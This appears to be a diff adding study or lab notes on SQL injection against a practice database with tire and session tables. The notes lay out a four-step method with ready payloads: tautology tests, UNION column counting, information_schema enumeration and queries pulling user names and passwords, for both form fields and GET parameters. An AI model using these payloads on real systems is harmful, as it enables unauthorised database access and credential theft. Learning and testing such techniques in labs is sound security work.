@@ -97,7 +97,19 @@ information schema you will need to query
 ## QUERY
 select tireid,name,size from session.tires ;    #case sensitive 
 
+standard sql injection                          Example
+1. IDENTIFY VULNERABLE FIELD/SELECTION      fORD' OR 1='1  #VULNERABILITY ALWAYS GIVE MORE INFORMATION
+2. IDENTIFY # OF COLUMNS/SELECTIONS         Audi' UNion SELECT 1,2,3,4 #                   #####HASHTAG A PART OF THE SYNTAX########
+3. MODIFY GOLDEN STATEMENT                  Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #  
+4. CRAFT QUERIES                            Audi' UNION SELECT tireid,2,name,size,cost from session.tires #  
+                                            Audi' UNION SELECT tireid,name,size,cost from session.tires #
 
+GET METHOD 
+1. IDENTIFY VULNERABLE FIELD/SELECTION      SELECTION=1 OR 1=1
+2. identify number of columns                SELECTION=1 UNION SELECT 1,2,3
+3 MODIFY THE GOLDEN RULE                      SELECTION=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
+4 CRAFT QUERY                                  SELECTION=2 UNION SELECT start,status,last_access from session.session_log
+                                                SELECTION=2 UNION SELECT id,name,pass from session.user
 
 
 
